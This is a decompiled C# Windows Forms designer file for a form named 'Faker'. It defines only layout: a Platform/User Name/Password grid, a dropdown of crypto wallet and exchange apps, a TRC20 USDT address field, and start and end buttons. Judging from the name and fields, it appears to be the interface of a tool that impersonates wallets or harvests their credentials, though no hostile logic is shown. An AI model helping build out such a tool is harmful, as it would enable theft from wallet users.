// Token: 0x02000074 RID: 116
[global::Microsoft.VisualBasic.CompilerServices.DesignerGenerated]
public partial class Faker : global::System.Windows.Forms.Form
{
	// Token: 0x0600055C RID: 1372 RVA: 0x00084BA4 File Offset: 0x00082DA4
	[global::System.Diagnostics.DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	// Token: 0x0600055D RID: 1373 RVA: 0x00084BE8 File Offset: 0x00082DE8
	[global::System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.DataGridView1 = new global::System.Windows.Forms.DataGridView();
		this.plat = new global::System.Windows.Forms.DataGridViewTextBoxColumn();
		this.n = new global::System.Windows.Forms.DataGridViewTextBoxColumn();
		this.pass = new global::System.Windows.Forms.DataGridViewTextBoxColumn();
		this.ComboPrims = new global::System.Windows.Forms.ComboBox();
		this.Label4 = new global::System.Windows.Forms.Label();
		this.usdtadress = new global::System.Windows.Forms.TextBox();
		this.Button1 = new global::System.Windows.Forms.Button();
		this.Button20 = new global::System.Windows.Forms.Button();
		this.Label2 = new global::System.Windows.Forms.Label();
		this.PictureBox1 = new global::System.Windows.Forms.PictureBox();
		this.sButton1 = new global::Sipaa.Framework.SButton();
		((global::System.ComponentModel.ISupportInitialize)this.DataGridView1).BeginInit();
		((global::System.ComponentModel.ISupportInitialize)this.PictureBox1).BeginInit();
		base.SuspendLayout();
		this.DataGridView1.AutoSizeColumnsMode = global::System.Windows.Forms.DataGridViewAutoSizeColumnsMode.Fill;
		this.DataGridView1.AutoSizeRowsMode = global::System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
		this.DataGridView1.BackgroundColor = global::System.Drawing.Color.FromArgb(10, 0, 10);
		this.DataGridView1.ColumnHeadersHeightSizeMode = global::System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.DataGridView1.Columns.AddRange(new global::System.Windows.Forms.DataGridViewColumn[]
		{
			this.plat,
			this.n,
			this.pass
		});
		this.DataGridView1.Dock = global::System.Windows.Forms.DockStyle.Bottom;
		this.DataGridView1.Location = new global::System.Drawing.Point(0, 618);
		this.DataGridView1.Name = "DataGridView1";
		this.DataGridView1.RowHeadersVisible = false;
		this.DataGridView1.RowHeadersWidth = 62;
		this.DataGridView1.Size = new global::System.Drawing.Size(640, 43);
		this.DataGridView1.TabIndex = 0;
		this.plat.HeaderText = "Platform";
		this.plat.MinimumWidth = 8;
		this.plat.Name = "plat";
		this.n.HeaderText = "User Name";
		this.n.MinimumWidth = 8;
		this.n.Name = "n";
		this.pass.HeaderText = "Password";
		this.pass.MinimumWidth = 8;
		this.pass.Name = "pass";
		this.ComboPrims.BackColor = global::System.Drawing.Color.Black;
		this.ComboPrims.DropDownStyle = global::System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.ComboPrims.FlatStyle = global::System.Windows.Forms.FlatStyle.Popup;
		this.ComboPrims.ForeColor = global::System.Drawing.Color.White;
		this.ComboPrims.FormattingEnabled = true;
		this.ComboPrims.Items.AddRange(new object[]
		{
			"metamask",
			"imtoken",
			"tokenpocket",
			"trust",
			"binance",
			"okx"
		});
		this.ComboPrims.Location = new global::System.Drawing.Point(143, 114);
		this.ComboPrims.Margin = new global::System.Windows.Forms.Padding(2);
		this.ComboPrims.Name = "ComboPrims";
		this.ComboPrims.Size = new global::System.Drawing.Size(241, 21);
		this.ComboPrims.TabIndex = 38;
		this.Label4.AutoSize = true;
		this.Label4.Font = new global::System.Drawing.Font("Palatino Linotype", 10f, global::System.Drawing.FontStyle.Bold);
		this.Label4.ForeColor = global::System.Drawing.Color.DarkRed;
		this.Label4.Location = new global::System.Drawing.Point(73, 231);
		this.Label4.Name = "Label4";
		this.Label4.Size = new global::System.Drawing.Size(40, 19);
		this.Label4.TabIndex = 43;
		this.Label4.Text = "trc20";
		this.usdtadress.BackColor = global::System.Drawing.Color.Black;
		this.usdtadress.BorderStyle = global::System.Windows.Forms.BorderStyle.FixedSingle;
		this.usdtadress.ForeColor = global::System.Drawing.Color.Red;
		this.usdtadress.Location = new global::System.Drawing.Point(143, 231);
		this.usdtadress.Name = "usdtadress";
		this.usdtadress.Size = new global::System.Drawing.Size(241, 20);
		this.usdtadress.TabIndex = 42;
		this.Button1.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
		this.Button1.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 10f);
		this.Button1.ForeColor = global::System.Drawing.Color.DarkRed;
		this.Button1.ImageAlign = global::System.Drawing.ContentAlignment.MiddleRight;
		this.Button1.Location = new global::System.Drawing.Point(268, 349);
		this.Button1.Name = "Button1";
		this.Button1.Size = new global::System.Drawing.Size(128, 45);
		this.Button1.TabIndex = 41;
		this.Button1.Text = "end";
		this.Button1.UseVisualStyleBackColor = true;
		this.Button1.Click += new global::System.EventHandler(this.Button1_Click);
		this.Button20.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
		this.Button20.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 10f);
		this.Button20.ForeColor = global::System.Drawing.Color.DarkRed;
		this.Button20.ImageAlign = global::System.Drawing.ContentAlignment.MiddleRight;
		this.Button20.Location = new global::System.Drawing.Point(61, 349);
		this.Button20.Name = "Button20";
		this.Button20.Size = new global::System.Drawing.Size(128, 45);
		this.Button20.TabIndex = 40;
		this.Button20.Text = "start";
		this.Button20.UseVisualStyleBackColor = true;
		this.Button20.Click += new global::System.EventHandler(this.Button20_Click);
		this.Label2.AutoSize = true;
		this.Label2.Font = new global::System.Drawing.Font("Palatino Linotype", 10f, global::System.Drawing.FontStyle.Bold);
		this.Label2.ForeColor = global::System.Drawing.Color.DarkRed;
		this.Label2.Location = new global::System.Drawing.Point(73, 112);
		this.Label2.Name = "Label2";
		this.Label2.Size = new global::System.Drawing.Size(32, 19);
		this.Label2.TabIndex = 39;
		this.Label2.Text = "app";
		this.PictureBox1.BackColor = global::System.Drawing.Color.Black;
		this.PictureBox1.Dock = global::System.Windows.Forms.DockStyle.Top;
		this.PictureBox1.Location = new global::System.Drawing.Point(0, 0);
		this.PictureBox1.Name = "PictureBox1";
		this.PictureBox1.Size = new global::System.Drawing.Size(640, 89);
		this.PictureBox1.SizeMode = global::System.Windows.Forms.PictureBoxSizeMode.Zoom;
		this.PictureBox1.TabIndex = 44;
		this.PictureBox1.TabStop = false;
		this.sButton1.BackColor = global::System.Drawing.Color.MediumSlateBlue;
		this.sButton1.BorderColor = global::System.Drawing.Color.PaleVioletRed;
		this.sButton1.BorderRadius = 6;
		this.sButton1.BorderSize = 0;
		this.sButton1.FlatAppearance.BorderSize = 0;
		this.sButton1.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
		this.sButton1.ForeColor = global::System.Drawing.Color.White;
		this.sButton1.Location = new global::System.Drawing.Point(211, 458);
		this.sButton1.Name = "sButton1";
		this.sButton1.Size = new global::System.Drawing.Size(150, 40);
		this.sButton1.TabIndex = 45;
		this.sButton1.Text = "sButton1";
		this.sButton1.UseVisualStyleBackColor = false;
		this.sButton1.Click += new global::System.EventHandler(this.sButton1_Click);
		base.AutoScaleDimensions = new global::System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = global::System.Drawing.Color.Black;
		base.ClientSize = new global::System.Drawing.Size(640, 661);
		base.Controls.Add(this.sButton1);
		base.Controls.Add(this.PictureBox1);
		base.Controls.Add(this.Label4);
		base.Controls.Add(this.usdtadress);
		base.Controls.Add(this.Button1);
		base.Controls.Add(this.Button20);
		base.Controls.Add(this.Label2);
		base.Controls.Add(this.ComboPrims);
		base.Controls.Add(this.DataGridView1);
		base.FormBorderStyle = global::System.Windows.Forms.FormBorderStyle.FixedToolWindow;
		base.Name = "Faker";
		base.ShowIcon = false;
		base.ShowInTaskbar = false;
		this.Text = "Faker";
		((global::System.ComponentModel.ISupportInitialize)this.DataGridView1).EndInit();
		((global::System.ComponentModel.ISupportInitialize)this.PictureBox1).EndInit();
		base.ResumeLayout(false);
		base.PerformLayout();
	}

	// Token: 0x0400075E RID: 1886
	private global::System.ComponentModel.IContainer components;

	// Token: 0x04000767 RID: 1895
	[global::System.Runtime.CompilerServices.AccessedThroughProperty("DataGridView1")]
	internal global::System.Windows.Forms.DataGridView DataGridView1;

	// Token: 0x04000768 RID: 1896
	[global::System.Runtime.CompilerServices.AccessedThroughProperty("plat")]
	internal global::System.Windows.Forms.DataGridViewTextBoxColumn plat;

	// Token: 0x04000769 RID: 1897
	[global::System.Runtime.CompilerServices.AccessedThroughProperty("n")]
	internal global::System.Windows.Forms.DataGridViewTextBoxColumn n;

	// Token: 0x0400076A RID: 1898
	[global::System.Runtime.CompilerServices.AccessedThroughProperty("pass")]
	internal global::System.Windows.Forms.DataGridViewTextBoxColumn pass;

	// Token: 0x0400076E RID: 1902
	[global::System.Runtime.CompilerServices.AccessedThroughProperty("ComboPrims")]
	internal global::System.Windows.Forms.ComboBox ComboPrims;

	// Token: 0x0400076F RID: 1903
	[global::System.Runtime.CompilerServices.AccessedThroughProperty("Label4")]
	internal global::System.Windows.Forms.Label Label4;

	// Token: 0x04000770 RID: 1904
	[global::System.Runtime.CompilerServices.AccessedThroughProperty("usdtadress")]
	internal global::System.Windows.Forms.TextBox usdtadress;

	// Token: 0x04000771 RID: 1905
	internal global::System.Windows.Forms.Button Button1;

	// Token: 0x04000772 RID: 1906
	internal global::System.Windows.Forms.Button Button20;

	// Token: 0x04000773 RID: 1907
	[global::System.Runtime.CompilerServices.AccessedThroughProperty("Label2")]
	internal global::System.Windows.Forms.Label Label2;

	// Token: 0x04000774 RID: 1908
	private global::Sipaa.Framework.SButton sButton1;

	// Token: 0x04000775 RID: 1909
	[global::System.Runtime.CompilerServices.AccessedThroughProperty("PictureBox1")]
	internal global::System.Windows.Forms.PictureBox PictureBox1;
}
